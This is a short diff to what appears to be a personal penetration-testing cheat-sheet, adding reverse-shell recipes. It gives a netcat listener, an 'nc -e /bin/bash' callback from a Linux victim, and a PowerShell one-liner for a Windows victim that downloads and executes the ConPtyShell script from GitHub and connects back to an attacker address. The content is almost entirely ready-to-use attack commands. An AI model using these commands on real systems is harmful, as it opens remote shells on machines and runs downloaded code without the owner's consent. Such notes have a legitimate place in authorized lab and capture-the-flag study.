@@ -235,6 +235,28 @@
 
 	sudo mysql -h 10.10.229.126 -u root -p
 
+`reversing from netcat`
+
+`on linux machine`
+
+attacker machine 
+
+	nc -nvlp 9578
+
+victim machine
+
+	nc -e /bin/bash {ip of attacker} 9578
+	
+`on windows machine`
+
+attacker machine 
+
+	stty raw -echo; (stty size; cat) | nc -lvnp 3001
+	
+victim machine with powershell
+
+	IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
+
 
 # @cc github.com/prakashchand72
 
